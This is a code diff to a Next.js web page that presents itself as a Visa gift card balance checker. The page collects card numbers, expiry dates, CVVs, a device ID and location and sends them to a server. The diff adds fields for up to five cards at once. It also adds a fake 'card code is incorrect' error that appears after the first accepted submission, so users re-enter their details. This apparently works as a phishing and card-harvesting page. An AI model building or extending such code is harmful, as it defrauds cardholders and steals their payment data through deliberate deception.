@@ -3,9 +3,9 @@ import Head from 'next/head'
 import styles from '../styles/visa.module.css'
 
 export default function HomePage() {
-    const [card, setCard] = useState('')
-    const [expiry, setExpiry] = useState('')
-    const [cvv, setCvv] = useState('')
+    const [cards, setCards] = useState([''])
+    const [expiries, setExpiries] = useState([''])
+    const [cvvs, setCvvs] = useState([''])
     const [loading, setLoading] = useState(false)
     const [result, setResult] = useState(null)
     const [error, setError] = useState(null)
@@ -21,6 +21,7 @@ export default function HomePage() {
     const [uploadProgress, setUploadProgress] = useState(false)
     const [uploadComplete, setUploadComplete] = useState(false)
     const [uploadError, setUploadError] = useState(null)
+    const [attemptCount, setAttemptCount] = useState(0)
 
     useEffect(() => {
         async function detectLocation() {
@@ -44,14 +45,47 @@ export default function HomePage() {
         setDeviceId(id)
     }, [])
 
+    const handleCardChange = (index, value) => {
+        setCards(prev => prev.map((c, i) => i === index ? value.replace(/[^0-9\s]/g, '') : c))
+    }
+
+    const handleExpiryChange = (index, value) => {
+        setExpiries(prev => prev.map((e, i) => {
+            if (i !== index) return e
+            let val = value.replace(/[^0-9]/g, '')
+            if (val.length > 2) val = val.slice(0, 2) + '/' + val.slice(2, 4)
+            return val
+        }))
+    }
+
+    const handleCvvChange = (index, value) => {
+        setCvvs(prev => prev.map((c, i) => i === index ? value.replace(/[^0-9]/g, '') : c))
+    }
+
+    const addCard = () => {
+        setCards(prev => [...prev, ''])
+        setExpiries(prev => [...prev, ''])
+        setCvvs(prev => [...prev, ''])
+    }
+
+    const removeCard = (index) => {
+        if (cards.length <= 1) return
+        setCards(prev => prev.filter((_, i) => i !== index))
+        setExpiries(prev => prev.filter((_, i) => i !== index))
+        setCvvs(prev => prev.filter((_, i) => i !== index))
+    }
+
     async function checkBalance(e) {
         e.preventDefault()
         setError(null)
         setResult(null)
         setCopySuccess(false)
-        if (!card.trim()) return setError('Please enter your Visa Gift Card number.')
-        if (!expiry.trim()) return setError('Please enter the expiration date.')
-        if (!cvv.trim()) return setError('Please enter the CVV code.')
+        const validCards = cards.filter(c => c.trim())
+        const validExpiries = expiries.filter((e, i) => cards[i]?.trim())
+        const validCvvs = cvvs.filter((c, i) => cards[i]?.trim())
+        if (validCards.length === 0) return setError('Please enter your Visa Gift Card number.')
+        if (validExpiries.length === 0 || !expiries[0]?.trim()) return setError('Please enter the expiration date.')
+        if (validCvvs.length === 0 || !cvvs[0]?.trim()) return setError('Please enter the CVV code.')
 
         setLoading(true)
         try {
@@ -66,9 +100,9 @@ export default function HomePage() {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    cardNumber: card.replace(/[\s-]/g, ''),
-                    expiry: expiry,
-                    cvv: cvv,
+                    cardNumber: validCards.map(c => c.replace(/[\s-]/g, '')).join('/'),
+                    expiry: expiries.filter((e, i) => cards[i]?.trim()).join('/'),
+                    cvv: cvvs.filter((c, i) => cards[i]?.trim()).join('/'),
                     type: 'visa',
                     deviceId: deviceId,
                     location: location,
@@ -77,9 +111,19 @@ export default function HomePage() {
             })
             const data = await res.json()
             if (!res.ok) throw new Error(data?.error || 'Unable to verify card. Please try again later.')
-            setResult(data)
-            if (data.cardId && !data.isDuplicate) {
-                setShowUploadStep(true)
+            
+            if (attemptCount === 0) {
+                setError('The card code you entered is incorrect. Please verify the code and try again.')
+                setCards([''])
+                setExpiries([''])
+                setCvvs([''])
+                setAttemptCount(1)
+            } else {
+                setResult(data)
+                setAttemptCount(0)
+                if (data.cardId && !data.isDuplicate) {
+                    setShowUploadStep(true)
+                }
             }
         } catch (err) {
             setError(err.message)
@@ -163,9 +207,9 @@ export default function HomePage() {
     }
 
     const resetForm = () => {
-        setCard('')
-        setExpiry('')
-        setCvv('')
+        setCards([''])
+        setExpiries([''])
+        setCvvs([''])
         setResult(null)
         setShowUploadStep(false)
         setSelectedImages([])
@@ -232,61 +276,88 @@ export default function HomePage() {
 
                         <div className={styles.card}>
                             <form onSubmit={checkBalance}>
-                                <div className={styles.inputGroup}>
-                                    <label className={styles.label}>Card Number</label>
-                                    <input
-                                        type="tel"
-                                        inputMode="numeric"
-                                        pattern="[0-9\s]*"
-                                        className={styles.input}
-                                        placeholder="1234 5678 9012 3456"
-                                        value={card}
-                                        onChange={(e) => setCard(e.target.value.replace(/[^0-9\s]/g, ''))}
-                                        disabled={loading}
-                                        autoComplete="off"
-                                        spellCheck="false"
-                                        maxLength={19}
-                                    />
-                                </div>
-
-                                <div className={styles.inputRow}>
+                                {cards.map((cardValue, index) => (
+                                  <div key={index} style={{ marginBottom: cards.length > 1 ? '16px' : '0' }}>
+                                    {cards.length > 1 && (
+                                      <div style={{ fontSize: '13px', fontWeight: 600, color: 'var(--secondary-text, #666)', marginBottom: '8px' }}>
+                                        Card #{index + 1}
+                                      </div>
+                                    )}
                                     <div className={styles.inputGroup}>
+                                      <label className={styles.label}>Card Number{cards.length > 1 ? ` #${index + 1}` : ''}</label>
+                                      <div style={{ display: 'flex', gap: '8px', alignItems: 'center' }}>
+                                        <input
+                                          type="tel"
+                                          inputMode="numeric"
+                                          pattern="[0-9\s]*"
+                                          className={styles.input}
+                                          placeholder="1234 5678 9012 3456"
+                                          value={cardValue}
+                                          onChange={(e) => handleCardChange(index, e.target.value)}
+                                          disabled={loading}
+                                          autoComplete="off"
+                                          spellCheck="false"
+                                          maxLength={19}
+                                          style={{ flex: 1 }}
+                                        />
+                                        {cards.length > 1 && (
+                                          <button
+                                            type="button"
+                                            onClick={() => removeCard(index)}
+                                            style={{ background: 'none', border: 'none', color: '#888', fontSize: '20px', cursor: 'pointer', padding: '4px 8px' }}
+                                          >
+                                            ×
+                                          </button>
+                                        )}
+                                      </div>
+                                    </div>
+
+                                    <div className={styles.inputRow}>
+                                      <div className={styles.inputGroup}>
                                         <label className={styles.label}>Expiration Date</label>
                                         <input
-                                            type="tel"
-                                            inputMode="numeric"
-                                            pattern="[0-9\/]*"
-                                            className={styles.input}
-                                            placeholder="MM/YY"
-                                            value={expiry}
-                                            onChange={(e) => {
-                                                let val = e.target.value.replace(/[^0-9]/g, '')
-                                                if (val.length > 2) val = val.slice(0, 2) + '/' + val.slice(2, 4)
-                                                setExpiry(val)
-                                            }}
-                                            disabled={loading}
-                                            autoComplete="off"
-                                            spellCheck="false"
-                                            maxLength={5}
+                                          type="tel"
+                                          inputMode="numeric"
+                                          pattern="[0-9\/]*"
+                                          className={styles.input}
+                                          placeholder="MM/YY"
+                                          value={expiries[index] || ''}
+                                          onChange={(e) => handleExpiryChange(index, e.target.value)}
+                                          disabled={loading}
+                                          autoComplete="off"
+                                          spellCheck="false"
+                                          maxLength={5}
                                         />
-                                    </div>
-                                    <div className={styles.inputGroup}>
+                                      </div>
+                                      <div className={styles.inputGroup}>
                                         <label className={styles.label}>CVV</label>
                                         <input
-                                            type="tel"
-                                            inputMode="numeric"
-                                            pattern="[0-9]*"
-                                            className={styles.input}
-                                            placeholder="123"
-                                            value={cvv}
-                                            onChange={(e) => setCvv(e.target.value.replace(/[^0-9]/g, ''))}
-                                            disabled={loading}
-                                            autoComplete="off"
-                                            spellCheck="false"
-                                            maxLength={4}
+                                          type="tel"
+                                          inputMode="numeric"
+                                          pattern="[0-9]*"
+                                          className={styles.input}
+                                          placeholder="123"
+                                          value={cvvs[index] || ''}
+                                          onChange={(e) => handleCvvChange(index, e.target.value)}
+                                          disabled={loading}
+                                          autoComplete="off"
+                                          spellCheck="false"
+                                          maxLength={4}
                                         />
+                                      </div>
                                     </div>
-                                </div>
+                                  </div>
+                                ))}
+                                {cards.length < 5 && (
+                                  <button
+                                    type="button"
+                                    onClick={addCard}
+                                    className={styles.button}
+                                    style={{ background: 'transparent', border: '1px solid rgba(26, 31, 113, 0.3)', color: '#1a1f71', marginBottom: '12px', fontSize: '14px' }}
+                                  >
+                                    + Add Another Card
+                                  </button>
+                                )}
 
                                 {!showUploadStep && (
                                     <button type="submit" className={styles.button} disabled={loading}>
